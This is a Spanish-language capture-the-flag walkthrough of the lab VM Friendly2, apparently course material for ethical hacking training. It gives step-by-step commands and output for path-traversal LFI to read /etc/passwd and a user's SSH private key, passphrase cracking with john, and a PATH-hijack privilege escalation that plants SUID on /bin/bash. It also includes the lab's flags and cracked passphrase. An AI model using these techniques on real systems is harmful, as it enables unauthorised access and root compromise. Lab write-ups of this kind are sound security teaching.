---
title: "🖥️ Máquina: Friendly2 — Hacking Ético"
aliases:
  - Friendly2
  - friendly2
  - Máquina Friendly2
  - VM Friendly2
  - Writeup Friendly2
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Friendly2

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** LFI · Robo de clave SSH privada · Cracking de passphrase (ssh2john + john) · PATH Hijacking (sudo SETENV) · SUID en bash · Descifrado ROT13  
> **Descripción:** En esta práctica encontraremos un LFI en la web que nos permitirá leer la clave SSH privada de un usuario. La clave está protegida con passphrase que crackearemos con john. La escalada de privilegios se basa en un PATH Hijacking sobre un script ejecutable con sudo y SETENV, que usaremos para asignar el bit SUID a bash. La flag de root está cifrada con ROT13 y para descifrarla usaremos el propio script de la máquina.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.10`
* **`RHOST` (Víctima / Friendly2):** Ej. `10.0.0.30`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Friendly2 tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -A -p- 10.0.0.30
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Servicio de Mantenimiento de Ordenadores
```

> [!info] Resultado
> SSH y servidor web Apache. La web es un servicio de mantenimiento de ordenadores. Enumeramos directorios:

---

## 🌐 Fase 2: Enumeración web y descubrimiento de LFI

```bash
gobuster dir -r -u "http://10.0.0.30" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
/tools   (Status: 200) [Size: 813]
/assets  (Status: 200) [Size: 1549]
```

> [!info] Resultado
> Dos recursos. /assets/ contiene imágenes. En /tools/ hay instrucciones y revisando el código fuente encontramos un comentario revelador:

```text
<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
```

> [!info] Resultado
> La página usa un parámetro doc para cargar archivos. Probamos si hay LFI:

```bash
http://10.0.0.30/tools/check_if_exist.php?doc=/etc/passwd
```

> [!info] Resultado
> Sin traversal no devuelve nada. Con path traversal sí funciona:

```bash
http://10.0.0.30/tools/check_if_exist.php?doc=../../../../../../../../etc/passwd
```

```text
...
gh0st:x:1001:1001::/home/gh0st:/bin/bash
...
```

> [!info] Resultado
> LFI confirmado. Hay un usuario gh0st con shell bash. Exploramos su directorio home en busca de claves SSH:

```bash
http://10.0.0.30/tools/check_if_exist.php?doc=../../../../../../../../home/gh0st/.bashrc
```

```bash
http://10.0.0.30/tools/check_if_exist.php?doc=../../../../../../../../home/gh0st/.bash_history
```

> [!info] Resultado
> Nada relevante en esos archivos. Probamos con las claves SSH:

```bash
http://10.0.0.30/tools/check_if_exist.php?doc=../../../../../../../../home/gh0st/.ssh/id_rsa
```

> [!info] Resultado
> Clave privada visible. Antes de descargarla verificamos que esté registrada en el authorized_keys del servidor:

```bash
http://10.0.0.30/tools/check_if_exist.php?doc=../../../../../../../../home/gh0st/.ssh/authorized_keys
```

> [!info] Resultado
> La clave pública de gh0st está en authorized_keys, lo que confirma que podremos autenticarnos con su clave privada. La descargamos:

---

## 🔑 Fase 3: Obtención y cracking de la clave SSH

```bash
curl "http://10.0.0.30/tools/check_if_exist.php?doc=../../../../../../../home/gh0st/.ssh/id_rsa" > id_friendly2
```

```bash
cat id_friendly2
```

```bash
chmod 600 id_friendly2
```

```bash
ssh -i id_friendly2 gh0st@10.0.0.30
```

```text
Enter passphrase for key 'id_friendly2':
```

> [!info] Resultado
> La clave privada está protegida con passphrase. La crackeamos con ssh2john y john:

```bash
ssh2john id_friendly2 > hash_gh0st
```

```bash
john hash_gh0st --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
celtic           (id_friendly2)
```

> [!info] Resultado
> Passphrase encontrada: celtic. Nos conectamos:

```bash
ssh -i id_friendly2 gh0st@10.0.0.30
```

```text
Enter passphrase for key 'id_friendly2': celtic
```

```bash
id;whoami
```

```text
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)
gh0st
```

```bash
ls -l
```

```bash
cat user.txt
```

```text
ab0366431e2d8ff563cf34272e3d14bd
```

> [!info] Resultado
> Flag de usuario obtenida: ab0366431e2d8ff563cf34272e3d14bd

---

## 🚀 Fase 4: Escalada de privilegios — PATH Hijacking con SETENV

```bash
sudo -l
```

```text
(ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

> [!info] Resultado
> gh0st puede ejecutar /opt/security.sh como root con la opción SETENV. SETENV permite pasar variables de entorno al contexto de sudo, incluyendo PATH. Inspeccionamos el script:

```bash
cat /opt/security.sh
```

```text
#!/bin/bash
echo "Enter the string to encode:"
read string
# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi
# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi
sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'
encoded_string=$(echo "$string" | tr $sus1 $sus2)
echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

> [!info] Resultado
> El script usa el comando tr sin ruta absoluta. Al ejecutarse con sudo y SETENV podemos inyectar un /tmp malicioso al principio del PATH para que el sistema encuentre nuestro tr falso antes que el real. Probamos primero con echo pero no funciona. Usamos tr como vector.
> La estrategia es: en lugar de conseguir una shell directamente, hacemos que nuestro tr falso asigne el bit SUID a /bin/bash. Primero verificamos que bash aún no tiene SUID:

```bash
ls -l /bin/bash
```

```text
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Creamos el tr malicioso en /tmp:

```bash
echo "chmod +s /bin/bash" > /tmp/tr
```

```bash
chmod +x /tmp/tr
```

Ejecutamos el script con nuestro PATH modificado:

```bash
sudo PATH=/tmp:$PATH /opt/security.sh
```

```text
Enter the string to encode:
(ENTER)
Original string:
Encoded string:
```

> [!info] Resultado
> El script se ejecutó. Comprobamos si bash tiene ahora el bit SUID:

```bash
ls -l /bin/bash
```

```text
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

> [!info] Resultado
> Aparece la s en los permisos de propietario y grupo, confirmando que el SUID está activo. Según GTFOBins, con SUID en bash basta con ejecutarlo con -p para que conserve el euid de root:

```bash
/bin/bash -p
```

```bash
id
```

```text
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) egid=0(root) groups=0(root),1001(gh0st)
```

> [!info] Resultado
> euid=0 confirma que operamos con efectivo privilegio de root. Buscamos la flag:

---

## 🏴 Fase 5: Localización y descifrado de la flag de root

```bash
cd /root
```

```bash
ls -la
```

```bash
cat root.txt
```

```text
Not yet! Try to find root.txt.
Hint: ...
```

> [!info] Resultado
> La flag no está ahí. El hint apunta a ..., que es literalmente el nombre de un directorio en la raíz del sistema:

```bash
cd /
```

```bash
ls -la
```

```bash
cd ...
```

```bash
cat ebbg.txt
```

```text
It's codified, look the cipher:
98199n723q0s44s6rs39r33685q8pnoq
Hint: numbers are not codified
```

> [!info] Resultado
> La cadena está cifrada. El hint de que los números no están cifrados y que el script de la máquina usa tr 'A-Za-z' 'N-ZA-Mn-za-m' revela que el cifrado es ROT13 (desplazamiento de 13 posiciones en el alfabeto). El propio script de la máquina sirve para descifrarlo ya que ROT13 es simétrico: aplicar la misma transformación dos veces devuelve el texto original.
> Sin embargo la cadena tiene 32 caracteres y el script limita a 20. Renombramos nuestro tr falso para que no interfiera y editamos el script para ampliar el límite:

```bash
mv /tmp/tr /tmp/tt
```

```bash
nano /opt/security.sh
```

> [!info] Resultado
> Cambiamos la línea if [[ ${#string} -gt 20 ]]; then sustituyendo 20 por 50. Guardamos con CTRL+O y salimos con CTRL+X.

```bash
/opt/security.sh
```

```text
Enter the string to encode:
98199n723q0s44s6rs39r33685q8pnoq
Original string:  98199n723q0s44s6rs39r33685q8pnoq
Encoded string:   98199a723d0f44f6ef39e33685d8cabd
```

> [!info] Resultado
> Flag de root obtenida: 98199a723d0f44f6ef39e33685d8cabd

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
